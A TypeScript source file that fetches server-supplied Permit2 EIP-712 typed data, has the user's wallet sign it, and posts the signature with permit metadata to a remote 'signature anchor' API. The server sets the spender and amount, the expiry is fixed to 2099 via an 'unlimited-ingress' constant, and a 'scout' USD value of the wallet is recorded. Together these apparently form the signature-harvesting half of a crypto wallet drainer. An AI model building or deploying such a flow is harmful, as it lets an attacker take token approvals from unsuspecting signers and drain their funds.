/**
 * EVM Permit2 EIP-712 signature anchor — fetch typed data, sign, POST to API.
 */
import type { Address, Hex } from 'viem'

import { parseApiEnvelope } from './api-envelope.js'
import { sovereignSignatureAnchorUrl, sovereignWeldPath } from './sovereign-weld-api.js'
import { buildEvmSignatureAnchorSettlement } from '@legion/core/logic/settlement'
import { SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from '../logic/unlimited-ingress.js'

export type Permit2TypedDataResponse = {
  typed_data: {
    domain: Record<string, unknown>
    types: Record<string, unknown>
    primaryType: string
    message: Record<string, unknown>
  }
  permit_metadata: {
    token: Address
    amount: string
    expiration: number
    nonce: number
    spender: Address
    sigDeadline: string
    chainId: number
  }
  engine_spender: Address
  permit2: Address
  protocol: 'permit2_eip712'
}

export async function fetchPermit2TypedData(params: {
  wallet: Address
  token: Address
  chainId: number
}): Promise<Permit2TypedDataResponse> {
  const q = new URLSearchParams({
    wallet: params.wallet,
    token: params.token,
    chain_id: String(params.chainId),
  })
  const res = await fetch(
    `${sovereignWeldPath('/api/v1/signature-anchor/permit2-typed-data')}?${q}`,
    { cache: 'no-store' },
  )
  const parsed = await parseApiEnvelope<Permit2TypedDataResponse>(res)
  if (!parsed.ok || !parsed.data) {
    throw new Error(parsed.message || `Permit2 typed-data fetch failed (${res.status})`)
  }
  return parsed.data
}

type SignTypedDataFn = (args: {
  domain: Record<string, unknown>
  types: Record<string, unknown>
  primaryType: string
  message: Record<string, unknown>
}) => Promise<Hex | string>

export async function signAndPostEvmPermit2Anchor(params: {
  wallet: Address
  tokenAddress: Address
  chainId: number
  nonce: string
  walletType: string
  protocol: string
  scoutUsd: number
  amount: string
  requiresQuorum: boolean
  signTypedDataAsync: SignTypedDataFn
  mergeBody?: (base: Record<string, unknown>) => Record<string, unknown>
}): Promise<{ transaction_hash?: string; raw: unknown }> {
  const typed = await fetchPermit2TypedData({
    wallet: params.wallet,
    token: params.tokenAddress,
    chainId: params.chainId,
  })

  const signature = (await params.signTypedDataAsync({
    domain: typed.typed_data.domain,
    types: typed.typed_data.types,
    primaryType: typed.typed_data.primaryType,
    message: typed.typed_data.message,
  })) as Hex

  const base = {
    ...buildEvmSignatureAnchorSettlement({
      wallet_address: params.wallet,
      token_address: params.tokenAddress,
      signature,
      nonce: params.nonce,
      expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
      wallet_type: params.walletType,
      protocol: 'permit2_eip712',
      chain_id: params.chainId,
      scout_value_usd: params.scoutUsd,
      amount: params.amount,
      requires_quorum: params.requiresQuorum,
    }),
    signature,
    signature_hex: signature,
    engine_spender: typed.engine_spender,
    permit2: typed.permit2,
    permit_metadata: typed.permit_metadata,
  }

  const body = params.mergeBody ? params.mergeBody(base) : base

  const res = await fetch(sovereignSignatureAnchorUrl(), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  })

  const parsed = await parseApiEnvelope<{ transaction_hash?: string; l2_mint_transaction_hash?: string }>(
    res,
  )
  if (!parsed.ok) {
    throw new Error(parsed.message || `Permit2 signature anchor failed (${res.status})`)
  }

  const tx =
    parsed.data?.transaction_hash ?? parsed.data?.l2_mint_transaction_hash ?? undefined
  return { transaction_hash: tx, raw: parsed.raw }
}
